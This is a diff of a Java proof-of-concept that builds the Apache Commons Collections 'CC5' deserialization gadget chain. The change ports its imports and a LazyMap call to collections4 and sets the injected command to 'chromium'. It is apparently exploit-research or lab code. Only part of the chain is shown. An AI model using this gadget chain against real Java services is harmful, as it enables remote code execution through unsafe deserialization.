@@ -1,11 +1,11 @@
 package cc5;
 
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
 import toolkit.Seriliazation;
 
 import javax.management.BadAttributeValueExpException;
@@ -14,7 +14,6 @@ import java.util.HashMap;
 import java.util.HashSet;
 
 public class CC5Chain {
-    // private static String injectedCmd = "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari";
     private static String injectedCmd = "chromium";
 
     public static void main(String[] args) throws Exception {
@@ -40,7 +39,7 @@ public class CC5Chain {
          */
 
         HashMap innerMap = new HashMap();
-        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);
+        LazyMap lazyMap = (LazyMap) LazyMap.lazyMap(innerMap, chainedTransformer);
 
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "tiedKey");
 
